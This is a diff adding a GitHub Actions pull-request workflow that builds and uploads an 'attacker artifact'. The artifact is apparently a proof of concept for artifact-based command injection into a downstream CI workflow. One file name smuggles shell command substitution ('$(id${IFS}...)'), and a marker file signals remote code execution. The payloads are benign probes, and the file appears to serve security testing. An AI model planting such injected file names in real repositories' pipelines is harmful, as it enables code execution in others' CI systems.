@@ -1,0 +1,23 @@
+name: Tests-PR
+
+on:
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  produce:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build attacker artifact
+        run: |
+          mkdir -p /tmp/content
+          echo "${{ github.event.number }}" > /tmp/content/pr_number.txt
+          printf 'GAB_RCE_MARKER_CONTENT\n' > /tmp/content/ok.txt
+          printf 'trigger\n' > '/tmp/content/$(id${IFS}gab_nonexistent)$(echo ok).txt'
+          ls -la /tmp/content
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content-1
+          path: /tmp/content
